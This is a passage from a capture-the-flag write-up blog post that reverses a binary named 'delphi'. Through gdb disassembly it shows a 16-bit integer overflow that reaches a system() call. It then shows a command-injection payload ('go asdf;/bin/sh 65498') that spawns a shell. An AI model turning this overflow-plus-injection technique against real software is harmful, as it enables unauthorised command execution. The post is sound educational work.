<a name="True-8"></a>   <span class="err">0</span><span class="nf">x401c92</span> <span class="o">&lt;</span><span class="nv">main.doTheMagic</span><span class="o">+</span><span class="mi">98</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mh">0x68</span><span class="p">],</span><span class="nb">rdx</span>
<a name="True-9"></a><span class="nf">Guessed</span> <span class="nv">arguments</span><span class="p">:</span>
<a name="True-10"></a><span class="nf">arg</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span> <span class="mh">0x7ffff7e26d40</span> <span class="o">--&gt;</span> <span class="mh">0x8</span> 
<a name="True-11"></a><span class="nf">arg</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span> <span class="mh">0x4d37d0</span> <span class="o">--&gt;</span> <span class="mh">0x20</span> <span class="p">(</span><span class="s">&#39; &#39;</span><span class="p">)</span></code></pre></div>

<p>So it looks like our input is being split on spaces. We need to see how many parameters this thing expects…</p>

<div class="highlight"><pre><code class="language-nasm" data-lang="nasm"><a name="True-1"></a><span class="err">0</span><span class="nf">x0000000000401ca1</span> <span class="o">&lt;+</span><span class="mi">113</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">cmp</span>    <span class="nb">rax</span><span class="p">,</span><span class="mh">0x1</span>
<a name="True-2"></a>   <span class="err">0</span><span class="nf">x0000000000401ca5</span> <span class="o">&lt;+</span><span class="mi">117</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">jne</span>    <span class="mh">0x401d57</span> <span class="o">&lt;</span><span class="nv">main.doTheMagic</span><span class="o">+</span><span class="mi">295</span><span class="o">&gt;</span>
<a name="True-3"></a>   <span class="nf">...</span>
<a name="True-4"></a>   <span class="err">0</span><span class="nf">x0000000000401d57</span> <span class="o">&lt;+</span><span class="mi">295</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">cmp</span>    <span class="nb">rax</span><span class="p">,</span><span class="mh">0x3</span>
<a name="True-5"></a>   <span class="err">0</span><span class="nf">x0000000000401d5b</span> <span class="o">&lt;+</span><span class="mi">299</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">jne</span>    <span class="mh">0x401dd2</span> <span class="o">&lt;</span><span class="nv">main.doTheMagic</span><span class="o">+</span><span class="mi">418</span><span class="o">&gt;</span>
<a name="True-6"></a>   <span class="nf">...</span></code></pre></div>

<p>If you take into consideration the control flow going on here, and taking a peak at the bottom of our magic function:</p>

<div class="highlight"><pre><code class="language-nasm" data-lang="nasm"><a name="True-1"></a><span class="err">0</span><span class="nf">x0000000000401dbf</span> <span class="o">&lt;+</span><span class="mi">399</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x402230</span> <span class="o">&lt;</span><span class="nv">main._Cfunc_check_answer</span><span class="o">&gt;</span></code></pre></div>

<p>It seems to me we want to go into that function and in order to do that we would have to have <code>rax == 3</code>. Since we know the value in rax is controlled by our split function’s return value, we are going to have 3 parameters in our payload, one of them being “go”. Thus, it will look something like this:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><a name="True-1"></a>go &lt;something&gt; &lt;something&gt;</code></pre></div>

<p>Alright, so let’s checkout the check answer function:</p>

<div class="highlight"><pre><code class="language-nasm" data-lang="nasm"><a name="True-1"></a><span class="err">0</span><span class="nf">x0000000000402230</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">rcx</span><span class="p">,</span><span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="nb">fs</span><span class="p">:</span><span class="mh">0xfffffffffffffff0</span>
<a name="True-2"></a>   <span class="err">0</span><span class="nf">x0000000000402239</span> <span class="o">&lt;+</span><span class="mi">9</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">cmp</span>    <span class="nb">rsp</span><span class="p">,</span><span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rcx</span><span class="p">]</span>
<a name="True-3"></a>   <span class="err">0</span><span class="nf">x000000000040223c</span> <span class="o">&lt;+</span><span class="mi">12</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">ja</span>     <span class="mh">0x402245</span> <span class="o">&lt;</span><span class="nv">main._Cfunc_check_answer</span><span class="o">+</span><span class="mi">21</span><span class="o">&gt;</span>
<a name="True-4"></a>   <span class="err">0</span><span class="nf">x000000000040223e</span> <span class="o">&lt;+</span><span class="mi">14</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x428280</span> <span class="o">&lt;</span><span class="nv">runtime.morestack16_noctxt</span><span class="o">&gt;</span>
<a name="True-5"></a>   <span class="err">0</span><span class="nf">x0000000000402243</span> <span class="o">&lt;+</span><span class="mi">19</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">jmp</span>    <span class="mh">0x402230</span> <span class="o">&lt;</span><span class="nv">main._Cfunc_check_answer</span><span class="o">&gt;</span>
<a name="True-6"></a>   <span class="err">0</span><span class="nf">x0000000000402245</span> <span class="o">&lt;+</span><span class="mi">21</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">sub</span>    <span class="nb">rsp</span><span class="p">,</span><span class="mh">0x10</span>
<a name="True-7"></a>   <span class="err">0</span><span class="nf">x0000000000402249</span> <span class="o">&lt;+</span><span class="mi">25</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="mh">0x400f80</span>
<a name="True-8"></a>   <span class="err">0</span><span class="nf">x000000000040224e</span> <span class="o">&lt;+</span><span class="mi">30</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rsp</span><span class="p">],</span><span class="nb">rax</span>
<a name="True-9"></a>   <span class="err">0</span><span class="nf">x0000000000402252</span> <span class="o">&lt;+</span><span class="mi">34</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">rax</span><span class="p">,[</span><span class="nb">rsp</span><span class="o">+</span><span class="mh">0x18</span><span class="p">]</span>
<a name="True-10"></a>   <span class="err">0</span><span class="nf">x0000000000402257</span> <span class="o">&lt;+</span><span class="mi">39</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="nb">rax</span>
<a name="True-11"></a>   <span class="err">0</span><span class="nf">x000000000040225c</span> <span class="o">&lt;+</span><span class="mi">44</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x404da0</span> <span class="o">&lt;</span><span class="nv">runtime.cgocall</span><span class="o">&gt;</span>
<a name="True-12"></a>   <span class="err">0</span><span class="nf">x0000000000402261</span> <span class="o">&lt;+</span><span class="mi">49</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="nb">rsp</span><span class="p">,</span><span class="mh">0x10</span>
<a name="True-13"></a>   <span class="err">0</span><span class="nf">x0000000000402265</span> <span class="o">&lt;+</span><span class="mi">53</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">ret</span>    
<a name="True-14"></a>   <span class="err">0</span><span class="nf">x0000000000402266</span> <span class="o">&lt;+</span><span class="mi">54</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="kt">BYTE</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rax</span><span class="p">],</span><span class="nb">al</span>
<a name="True-15"></a>   <span class="err">0</span><span class="nf">x0000000000402268</span> <span class="o">&lt;+</span><span class="mi">56</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="kt">BYTE</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rax</span><span class="p">],</span><span class="nb">al</span>
<a name="True-16"></a>   <span class="err">0</span><span class="nf">x000000000040226a</span> <span class="o">&lt;+</span><span class="mi">58</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="kt">BYTE</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rax</span><span class="p">],</span><span class="nb">al</span>
<a name="True-17"></a>   <span class="err">0</span><span class="nf">x000000000040226c</span> <span class="o">&lt;+</span><span class="mi">60</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="kt">BYTE</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rax</span><span class="p">],</span><span class="nb">al</span>
<a name="True-18"></a>   <span class="err">0</span><span class="nf">x000000000040226e</span> <span class="o">&lt;+</span><span class="mi">62</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="kt">BYTE</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rax</span><span class="p">],</span><span class="nb">al</span></code></pre></div>

<p>Looks like this function calls this function: 0x400f80. I guess we should check that out then:</p>

<div class="highlight"><pre><code class="language-nasm" data-lang="nasm"><a name="True-1"></a><span class="err">0</span><span class="nf">x0000000000400f80</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">rsi</span><span class="p">,</span><span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rdi</span><span class="o">+</span><span class="mh">0x8</span><span class="p">]</span>
<a name="True-2"></a>   <span class="err">0</span><span class="nf">x0000000000400f84</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">edi</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rdi</span><span class="p">]</span>
<a name="True-3"></a>   <span class="err">0</span><span class="nf">x0000000000400f86</span> <span class="o">&lt;+</span><span class="mi">6</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">jmp</span>    <span class="mh">0x400de0</span> <span class="o">&lt;</span><span class="nb">ch</span><span class="nv">eck_answer@plt</span><span class="o">&gt;</span></code></pre></div>

<p>Well then, I guess our check_answer function is really apart of that libtwenty.so shared object file since we see our program using the plt to call it. </p>

<p>What is inside this check_answer function?</p>

<div class="highlight"><pre><code class="language-nasm" data-lang="nasm"><a name="True-1"></a><span class="nf">...</span>
<a name="True-2"></a>   <span class="err">0</span><span class="nf">x00007ffff7bd87d7</span> <span class="o">&lt;+</span><span class="mi">127</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x7ffff7bd8650</span> <span class="o">&lt;</span><span class="nv">strcat@plt</span><span class="o">&gt;</span>
<a name="True-3"></a>   <span class="err">0</span><span class="nf">x00007ffff7bd87dc</span> <span class="o">&lt;+</span><span class="mi">132</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">rax</span><span class="p">,[</span><span class="nb">rbp</span><span class="o">-</span><span class="mh">0x90</span><span class="p">]</span>
<a name="True-4"></a>   <span class="err">0</span><span class="nf">x00007ffff7bd87e3</span> <span class="o">&lt;+</span><span class="mi">139</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">rdi</span><span class="p">,</span><span class="nb">rax</span>
<a name="True-5"></a>   <span class="err">0</span><span class="nf">x00007ffff7bd87e6</span> <span class="o">&lt;+</span><span class="mi">142</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x7ffff7bd8630</span> <span class="o">&lt;</span><span class="nv">system@plt</span><span class="o">&gt;</span>
<a name="True-6"></a>   <span class="nf">...</span></code></pre></div>

<p>Ooo, a strcat and system call as well as no input validation… interesting… let’s try to see if we can get there:</p>

<div class="highlight"><pre><code class="language-nasm" data-lang="nasm"><a name="True-1"></a><span class="nf">...</span>
<a name="True-2"></a>   <span class="err">0</span><span class="nf">x00007ffff7bd8770</span> <span class="o">&lt;+</span><span class="mi">24</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">WORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">-</span><span class="mh">0x2</span><span class="p">],</span><span class="mh">0x2a</span>           <span class="c1">; Move 42 into rbp-0x2 (let&#39;s call this var1)</span>
<a name="True-3"></a>   <span class="err">0</span><span class="nf">x00007ffff7bd8776</span> <span class="o">&lt;+</span><span class="mi">30</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">rax</span><span class="p">,[</span><span class="nb">rbp</span><span class="o">-</span><span class="mh">0x90</span><span class="p">]</span>                    <span class="c1">; Load the address rbp-0x90 into rax</span>
<a name="True-4"></a>   <span class="err">0</span><span class="nf">x00007ffff7bd877d</span> <span class="o">&lt;+</span><span class="mi">37</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rax</span><span class="p">],</span><span class="mh">0x6f686365</span>        <span class="c1">; Put &quot;echo&quot; at rax</span>
<a name="True-5"></a>   <span class="err">0</span><span class="nf">x00007ffff7bd8783</span> <span class="o">&lt;+</span><span class="mi">43</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">WORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rax</span><span class="o">+</span><span class="mh">0x4</span><span class="p">],</span><span class="mh">0x20</span>           <span class="c1">; Put 32 at rax+4</span>
<a name="True-6"></a>   <span class="err">0</span><span class="nf">x00007ffff7bd8789</span> <span class="o">&lt;+</span><span class="mi">49</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">-</span><span class="mh">0x94</span><span class="p">]</span>          <span class="c1">; Put our parsed second parameter into eax (found this out with a little more reversing)</span>
<a name="True-7"></a>   <span class="err">0</span><span class="nf">x00007ffff7bd878f</span> <span class="o">&lt;+</span><span class="mi">55</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="kt">WORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">-</span><span class="mh">0x2</span><span class="p">],</span><span class="nb">ax</span>             <span class="c1">; Add rbp-0x2 (assigned to be 42) and our number and put back into rbp-0x2</span>
<a name="True-8"></a>   <span class="err">0</span><span class="nf">x00007ffff7bd8793</span> <span class="o">&lt;+</span><span class="mi">59</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">movzx</span>  <span class="nb">eax</span><span class="p">,</span><span class="kt">WORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">-</span><span class="mh">0x2</span><span class="p">]</span>            <span class="c1">; Put rbp-0x2 into eax</span>
<a name="True-9"></a>   <span class="err">0</span><span class="nf">x00007ffff7bd8797</span> <span class="o">&lt;+</span><span class="mi">63</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">cmp</span>    <span class="nb">eax</span><span class="p">,</span><span class="mh">0x4</span>                           <span class="c1">; Compare our sum of input + 42 to 4</span>
<a name="True-10"></a>   <span class="err">0</span><span class="nf">x00007ffff7bd879a</span> <span class="o">&lt;+</span><span class="mi">66</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">ja</span>     <span class="mh">0x7ffff7bd87ed</span> <span class="o">&lt;</span><span class="nb">ch</span><span class="nv">eck_answer</span><span class="o">+</span><span class="mi">149</span><span class="o">&gt;</span> <span class="c1">; If the sum is above 4, then exit check_answer</span>
<a name="True-11"></a>   <span class="nf">...</span></code></pre></div>

<p>So here is where our control flow can take either the red or blue pill and we want the “ja” to fail so we don’t end up at the end of the function, but instead in this interesting piece of code:</p>

<div class="highlight"><pre><code class="language-nasm" data-lang="nasm"><a name="True-1"></a><span class="nf">...</span>
<a name="True-2"></a>   <span class="err">0</span><span class="nf">x00007ffff7bd879c</span> <span class="o">&lt;+</span><span class="mi">68</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="nb">eax</span>
<a name="True-3"></a>   <span class="err">0</span><span class="nf">x00007ffff7bd879e</span> <span class="o">&lt;+</span><span class="mi">70</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">rdx</span><span class="p">,[</span><span class="nb">rax</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="mh">0x0</span><span class="p">]</span>
<a name="True-4"></a>   <span class="err">0</span><span class="nf">x00007ffff7bd87a6</span> <span class="o">&lt;+</span><span class="mi">78</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">rax</span><span class="p">,[</span><span class="nv">rip</span><span class="o">+</span><span class="mh">0xff</span><span class="p">]</span>        <span class="err">#</span> <span class="mh">0x7ffff7bd88ac</span>
<a name="True-5"></a>   <span class="err">0</span><span class="nf">x00007ffff7bd87ad</span> <span class="o">&lt;+</span><span class="mi">85</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rdx</span><span class="o">+</span><span class="nb">rax</span><span class="o">*</span><span class="mi">1</span><span class="p">]</span>
<a name="True-6"></a>   <span class="err">0</span><span class="nf">x00007ffff7bd87b0</span> <span class="o">&lt;+</span><span class="mi">88</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">movsxd</span> <span class="nb">rdx</span><span class="p">,</span><span class="nb">eax</span>
<a name="True-7"></a>   <span class="err">0</span><span class="nf">x00007ffff7bd87b3</span> <span class="o">&lt;+</span><span class="mi">91</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">rax</span><span class="p">,[</span><span class="nv">rip</span><span class="o">+</span><span class="mh">0xf2</span><span class="p">]</span>        <span class="err">#</span> <span class="mh">0x7ffff7bd88ac</span>
<a name="True-8"></a>   <span class="err">0</span><span class="nf">x00007ffff7bd87ba</span> <span class="o">&lt;+</span><span class="mi">98</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="nb">rax</span><span class="p">,</span><span class="nb">rdx</span>
<a name="True-9"></a>   <span class="err">0</span><span class="nf">x00007ffff7bd87bd</span> <span class="o">&lt;+</span><span class="mi">101</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">jmp</span>    <span class="nb">rax</span>
<a name="True-10"></a>   <span class="nf">...</span></code></pre></div>

<p>Which does some calculation stuff and then jumps to rax. OK, so in our comparison code we take 42 and add it to our second parameter. At this point we can guess our payload will look something like this:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><a name="True-1"></a>go &lt;something&gt; &lt;number&gt;</code></pre></div>

<p>So if we start with 42 and add the number we specified, how can we get that to be less than or equal to 4? Hmmm… well an integer overflow would sure do the trick :D This assembly actually looks really funky, like why would you use the ax register and add it to WORD [rbp-0x2] and compare 4 to the WORD [rbp-0x2]? Since a WORD is only two bytes, if we send in the maximum value of a WORD and add it to any value, the carry bit is going to be discarded because we will have exceeded the size of a WORD. So what if we send the largest size of a WORD - 42 == 2^16 - 42 == 65494?</p>

<div class="highlight"><pre><code class="language-nasm" data-lang="nasm"><a name="True-1"></a><span class="err">[----------------------------------</span><span class="nf">registers</span><span class="o">-----------------------------------</span><span class="p">]</span>
<a name="True-2"></a><span class="nl">RAX:</span> <span class="err">0</span><span class="nf">x0</span> 
<a name="True-3"></a><span class="err">[-------------------------------------</span><span class="nf">code</span><span class="o">-------------------------------------</span><span class="p">]</span>
<a name="True-4"></a>   <span class="err">0</span><span class="nf">x7ffff7bd8789</span> <span class="o">&lt;</span><span class="nb">ch</span><span class="nv">eck_answer</span><span class="o">+</span><span class="mi">49</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">-</span><span class="mh">0x94</span><span class="p">]</span>
<a name="True-5"></a>   <span class="err">0</span><span class="nf">x7ffff7bd878f</span> <span class="o">&lt;</span><span class="nb">ch</span><span class="nv">eck_answer</span><span class="o">+</span><span class="mi">55</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">add</span>    <span class="kt">WORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">-</span><span class="mh">0x2</span><span class="p">],</span><span class="nb">ax</span>
<a name="True-6"></a>   <span class="err">0</span><span class="nf">x7ffff7bd8793</span> <span class="o">&lt;</span><span class="nb">ch</span><span class="nv">eck_answer</span><span class="o">+</span><span class="mi">59</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">movzx</span>  <span class="nb">eax</span><span class="p">,</span><span class="kt">WORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">-</span><span class="mh">0x2</span><span class="p">]</span>
<a name="True-7"></a><span class="err">=&gt;</span> <span class="err">0</span><span class="nf">x7ffff7bd8797</span> <span class="o">&lt;</span><span class="nb">ch</span><span class="nv">eck_answer</span><span class="o">+</span><span class="mi">63</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">cmp</span>    <span class="nb">eax</span><span class="p">,</span><span class="mh">0x4</span>
<a name="True-8"></a>   <span class="err">0</span><span class="nf">x7ffff7bd879a</span> <span class="o">&lt;</span><span class="nb">ch</span><span class="nv">eck_answer</span><span class="o">+</span><span class="mi">66</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">ja</span>     <span class="mh">0x7ffff7bd87ed</span> <span class="o">&lt;</span><span class="nb">ch</span><span class="nv">eck_answer</span><span class="o">+</span><span class="mi">149</span><span class="o">&gt;</span>
<a name="True-9"></a>   <span class="err">0</span><span class="nf">x7ffff7bd879c</span> <span class="o">&lt;</span><span class="nb">ch</span><span class="nv">eck_answer</span><span class="o">+</span><span class="mi">68</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="nb">eax</span>
<a name="True-10"></a>   <span class="err">0</span><span class="nf">x7ffff7bd879e</span> <span class="o">&lt;</span><span class="nb">ch</span><span class="nv">eck_answer</span><span class="o">+</span><span class="mi">70</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">rdx</span><span class="p">,[</span><span class="nb">rax</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="mh">0x0</span><span class="p">]</span>
<a name="True-11"></a>   <span class="err">0</span><span class="nf">x7ffff7bd87a6</span> <span class="o">&lt;</span><span class="nb">ch</span><span class="nv">eck_answer</span><span class="o">+</span><span class="mi">78</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">rax</span><span class="p">,[</span><span class="nv">rip</span><span class="o">+</span><span class="mh">0xff</span><span class="p">]</span>        <span class="err">#</span> <span class="mh">0x7ffff7bd88ac</span></code></pre></div>

<p>Woah, eax is 0! So now we are going to hit that weird jump code. Now the question is, what does eax have to be to get the system code to be called? Well we could do the math here, or since we know eax can only be 0, 1, 2 or 4 we could just try setting eax to be those different numbers until we get it to work :D</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><a name="True-1"></a>➜  yvr  ./delphi 
<a name="True-2"></a>Welcome!
<a name="True-3"></a>
<a name="True-4"></a>Are you ready to play <span class="m">20</span> questions? No? Perfect!
<a name="True-5"></a>Im thinking of something big, metal, and orange. Go!
<a name="True-6"></a>&gt; go asdf <span class="m">65494</span>    <span class="c"># 2^16 - 42 + 0 == 65494 means eax = 0</span>
<a name="True-7"></a>&gt; go asdf <span class="m">65495</span>    <span class="c"># 2^16 - 42 + 1 == 65494 means eax = 1</span>
<a name="True-8"></a>&gt; go asdf <span class="m">65496</span>    <span class="c"># 2^16 - 42 + 2 == 65494 means eax = 2</span>
<a name="True-9"></a>&gt; go asdf <span class="m">65497</span>    <span class="c"># 2^16 - 42 + 3 == 65494 means eax = 3</span>
<a name="True-10"></a>&gt; go asdf <span class="m">65498</span>    <span class="c"># 2^16 - 42 + 4 == 65494 means eax = 4</span>
<a name="True-11"></a>asdf
<a name="True-12"></a>&gt;</code></pre></div>

<p>Boom! So we got that system call to be executed and all it does right now is “echo <our string="">". But if you look at the code again, it simply concatinates the 2nd part of our payload to the echo without checking for special characters, meaning we can just put a semicolon and execute arbituary commands :D</our></p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><a name="True-1"></a>➜  yvr  ./delphi
<a name="True-2"></a>Welcome!
<a name="True-3"></a>
<a name="True-4"></a>Are you ready to play <span class="m">20</span> questions? No? Perfect!
<a name="True-5"></a>Im thinking of something big, metal, and orange. Go!
<a name="True-6"></a>&gt; go asdf<span class="p">;</span>/bin/sh 65498
<a name="True-7"></a>asdf
<a name="True-8"></a><span class="nv">$ </span>cat flag.txt
<a name="True-9"></a>flag<span class="o">{</span>something or other<span class="o">}</span>  <span class="c"># Not the actual flag, running locally</span>
<a name="True-10"></a><span class="err">$</span></code></pre></div>

<p>Not too bad of a challenge, really was more reversing than actually exploitation. So when it all boils down, you have to reverse a basic command protocol, exploit and integer overflow and use metacharacter injection. For 200 points I would say that is reasonable :D</p>

</article>









      </div>
    </div>
  </div>

  <footer class="center">
  <div class="measure">
    <small>
      Thank you for reading dear reader, and good night...<br />
      Blog made with &lt;3 by Breadchris<br />
      Theme crafted with &lt;3 by <a href="http://johnotander.com">John Otander</a> (<a href="https://twitter.com/4lpine">@4lpine</a>).
    </small>
  </div>
</footer>

</body>
</html>
